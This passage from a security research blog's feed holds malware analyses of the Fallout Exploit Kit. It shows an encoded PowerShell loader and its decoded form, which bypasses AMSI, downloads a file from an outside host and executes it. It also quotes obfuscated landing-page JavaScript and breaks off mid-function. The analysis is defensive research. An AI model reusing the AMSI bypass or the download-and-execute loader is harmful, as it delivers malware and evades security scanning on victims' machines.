bAB7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAGwASQA7AHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABJAGwAMQBsADEAOwBwAHUAYgBsAGkAYwAgAHMAdAByAGkAbgBnACAAbABJADEAbABsADsAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAEkAbAAxADEAMQBJAEkASQBsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQAxAGwASQBsADEAbABsADEASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbABJAEkASQBsADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAGwAMQAxAEkAbABsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQBsADEASQBsAEkAbAAxADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJAGwASQBJAEkAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAEkAMQBsAEkAbABJADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJADEAbAAxADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABJAGwAbAAxAEkAbAA7AHAAdQBiAGwAaQBjACAAcwBoAG8AcgB0ACAASQBsAEkASQAxADsAcAB1AGIAbABpAGMAIABzAGgAbwByAHQAIABJAGwAbABJAGwAbAA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABsAGwASQBsAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbAAxAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbABJAGwAbABsAEkAMQBJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAASQAxAEkASQBJADsAfQA7AHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABsADEASQBsADEAMQBJAEkASQB7AFsARABsAGwASQBtAHAAbwByAHQAKAAiACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAiACwAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoAHMAdAByAGkAbgBnACAASQBJAGwASQBJAEkALABzAHQAcgBpAG4AZwAgAEkAbABJAGwASQAsAEkAbgB0AFAAdAByACAASQAxADEAbAAxAEkALABJAG4AdABQAHQAcgAgAGwAMQBsAEkAMQAsAGIAbwBvAGwAIABJAGwASQAxADEASQBJADEAMQAxADEALAB1AGkAbgB0ACAAbAAxADEAMQBJACwASQBuAHQAUAB0AHIAIABsAEkASQBJADEASQBsAGwASQAsAHMAdAByAGkAbgBnACAASQAxAEkAbAAxAGwASQAsAHIAZQBmACAAbABJADEAbABsADEASQBsADEASQAxAGwAIABsAGwAMQAxAEkASQBsADEASQAsAG8AdQB0ACAASQAxAGwASQBJADEASQBsADEAIABsAEkASQAxAEkASQApADsAfQAiADsAJABsAGwAbAAxAEkAbABsAEkAMQA9ACIAJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwATABvAHcAXAAkACgALQBqAG8AaQBuACgAKAA0ADgALgAuADUANwApACsAKAA2ADUALgAuADkAMAApACsAKAA5ADcALgAuADEAMgAyACkAfABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBDAG8AdQBuAHQAIAA4AHwAJQB7AFsAYwBoAGEAcgBdACQAXwB9ACkAKQAuAHQAbQBwACIAOwAkAEkAMQBsADEAMQBJADEAPQAnAGgAdAB0AHAAOgAvAC8AYgBlAGEAaABlAHIAbwA0AHUALgBjAG8AbQAvADEAOQA1ADAALQAwADEALQAxADEALwBPADgAWgByACcAOwBbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASgBHAE4AcwBhAFQAMABvAFQAbQBWADMATABVADkAaQBhAG0AVgBqAGQAQwBCAE8AWgBYAFEAdQBWADIAVgBpAFEAMgB4AHAAWgBXADUAMABLAFQAcwBrAFkAMgB4AHAATABrAGgAbABZAFcAUgBsAGMAbgBOAGIASgAxAFYAegBaAFgASQB0AFEAVwBkAGwAYgBuAFEAbgBYAFQAMABuAFMAagBVADMAVQBEAGwANQBNAFcAawB6AE0ARQAwAHgATQBEAEoAWQBOAFMAYwA3AEoARwBOAHMAYQBTADUARQBiADMAZAB1AGIARwA5AGgAWgBFAFoAcABiAEcAVQBvAEoARQBrAHgAYgBEAEUAeABTAFQARQBzAEoARwB4AHMAYgBEAEYASgBiAEcAeABKAE0AUwBrADcAJwApACkAfABpAGUAeAA7ACQASQAxAEkAMQBsADEASQBJAGwAbABJADEAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbABJADEAbABsADEASQBsADEASQAxAGwAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBsAEkASQAxAD0AMAB4ADAAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBJAEkAbABJAD0AWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAUwBpAHoAZQBPAGYAKAAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACkAOwAkAEkASQBsADEASQBsADEASQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQA7AFsAbAAxAEkAbAAxADEASQBJAEkAXQA6ADoAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoACQAbABsAGwAMQBJAGwAbABJADEALAAkAGwAbABsADEASQBsAGwASQAxACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAJABmAGEAbABzAGUALAAwAHgAMAAwADAAMAAwADAAMAA4ACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAIgBjADoAIgAsAFsAcgBlAGYAXQAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACwAWwByAGUAZgBdACQASQBJAGwAMQBJAGwAMQBJACkAfABvAHUAdAAtAG4AdQBsAGwAOwA</span><span class="o">=</span><span class="w">
</span></code></pre></div></div>

<p>Let’s decode and clean.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$l1Il1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="p">;</span><span class="w">
    </span><span class="nv">$l1Il1lI1IIl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1lI1IIl</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s2">"amsiInitFailed"</span><span class="p">,</span><span class="w"> </span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="bp">$true</span><span class="p">);</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">};</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="s2">"using System;using System.Diagnostics;using System.Runtime.InteropServices;[StructLayout(LayoutKind.Sequential)]public struct I1lII1Il1{public IntPtr IIlI1;public IntPtr lIl1I1II1l;public uint IIIIIlII;public uint Il111lIl1I1I;}[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct lI1ll1Il1I1l{public uint IIIlI;public string Il1l1;public string lI1ll;public string Il111IIIl;public uint I1lIl1ll1I;public uint IlIIIl1;public uint ll11Ill;public uint Il1IlIl1;public uint lIlIII;public uint lI1lIlI;public uint lI1l11;public uint Ill1Il;public short IlII1;public short IllIll;public IntPtr llIlIlIlI;public IntPtr Ill1IlIlI;public IntPtr IllIlllI1I1;public IntPtr I1III;};public static class l1Il11III{[DllImport(""kernel32.dll"",SetLastError=true)]public static extern bool CreateProcess(string IIlIII,string IlIlI,IntPtr I11l1I,IntPtr l1lI1,bool IlI11II1111,uint l111I,IntPtr lIII1IllI,string I1Il1lI,ref lI1ll1Il1I1l ll11IIl1I,out I1lII1Il1 lII1II);}"</span><span class="p">;</span><span class="w">

</span><span class="nv">$lll1IllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\AppData\LocalLow\</span><span class="si">$(</span><span class="o">-join</span><span class="p">((</span><span class="mi">48</span><span class="o">..</span><span class="mi">57</span><span class="si">)</span><span class="s2">+(65..90)+(97..122)|Get-Random -Count 8|%{[char]</span><span class="bp">$_</span><span class="s2">})).tmp"</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1l11I1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http://beahero4u.com/1950-01-11/O8Zr'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">);</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="n">Headers</span><span class="p">[</span><span class="s1">'User-Agent'</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'J57P9y1i30M102X5'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$I1l11I1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">lI1ll1Il1I1l</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IlII1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IIIlI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$I1I1l1IIllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$IIl1Il1I</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">I1lII1Il1</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">l1Il11III</span><span class="p">]::</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="nx">0x00000008</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="s2">"c:"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$I1I1l1IIllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$IIl1Il1I</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">out-null</span><span class="p">;</span><span class="w">
</span></code></pre></div></div>

<p>Thus the malware is downloaded and executed.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Fallout has been heavily updated, making analysis very difficult. Very sophisticated techniques such as Diffie-Hellman key exchange, VM detection, process detection, etc. are used. We need to be careful as they may be updated in the future.</p>
]]></content:encoded>
<pubDate>2019-07-09T15:00:00+00:00</pubDate>
</item>
<item>
<title>Analysis of Fallout Exploit Kit v3</title>
<link>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</link>
<guid>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We already tweeted, but the Fallout Exploit Kit has been updated. In the new Fallout, the traffic chain, obfuscation method of landing page and shellcode are changing. We will introduce details on the changes using <a href="http://malware-traffic-analysis.net/2019/02/28/index.html">Malware-Traffic-Analysis.net’s saz file</a>.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">New <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a> is using PoC on GitHub!<br />(CC: <a href="https://twitter.com/kafeine?ref_src=twsrc%5Etfw">@kafeine</a>, <a href="https://twitter.com/jeromesegura?ref_src=twsrc%5Etfw">@jeromesegura</a>, <a href="https://twitter.com/malware_traffic?ref_src=twsrc%5Etfw">@malware_traffic</a>)<a href="https://t.co/L1J5QOwJWn">https://t.co/L1J5QOwJWn</a><a href="https://t.co/ehhwtQqC5j">https://t.co/ehhwtQqC5j</a><a href="https://t.co/7opIhvSxg4">https://t.co/7opIhvSxg4</a> <a href="https://t.co/sJ1ESYpxbv">pic.twitter.com/sJ1ESYpxbv</a></p>&mdash; nao_sec (@nao_sec) <a href="https://twitter.com/nao_sec/status/1100931219242442752?ref_src=twsrc%5Etfw">2019年2月28日</a></blockquote>


<h2 id="traffic">Traffic</h2>
<p>As usual HookAds Campaign will reach the landing page of Fallout and the attack will start. The flow of traffic is like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<h2 id="landing-page">Landing Page</h2>
<p>Let’s read the JavaScript on the landing page. Firstly, the objects necessary for decoding are defined.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">OygitP9</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">fZ2S0q</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">cMa5g</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span><span class="p">,</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">p2Z2Fkoy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">P1mnrrMi834</span><span class="p">(</span><span class="nx">MQVCd</span><span class="p">);</span> <span class="nx">p2Z2Fkoy</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">b8j5WMF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">negriNm4A3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">negriNm4A3</span><span class="p">)</span> <span class="p">?</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span> <span class="p">:</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span><span class="p">),</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">m3Z1Kc</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">T82SkC</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">OcKyWsdOFyq</span>
    <span class="p">},</span>
    <span class="na">jbRyz</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">[^</span><span class="sr">A-Za-z0-9</span><span class="se">\+\/\=]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="p">(</span><span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))),</span> <span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">b8j5WMF</span><span class="p">),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">qT8fpZ1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">)),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">m3Z1Kc</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">));</span>
        <span class="k">return</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">quSjT4yyl</span><span class="p">(</span><span class="nx">T82SkC</span><span class="p">)</span>
    <span class="p">},</span>
    <span class="na">P1mnrrMi834</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">\r\n</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">);</span>
            <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="mi">127</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">2048</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">192</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">224</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">63</span> <span class="o">|</span> <span class="mi">128</span><span class="p">)),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span> <span class="o">|</span> <span class="mi">128</span><span class="p">))</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">},</span>
    <span class="na">quSjT4yyl</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
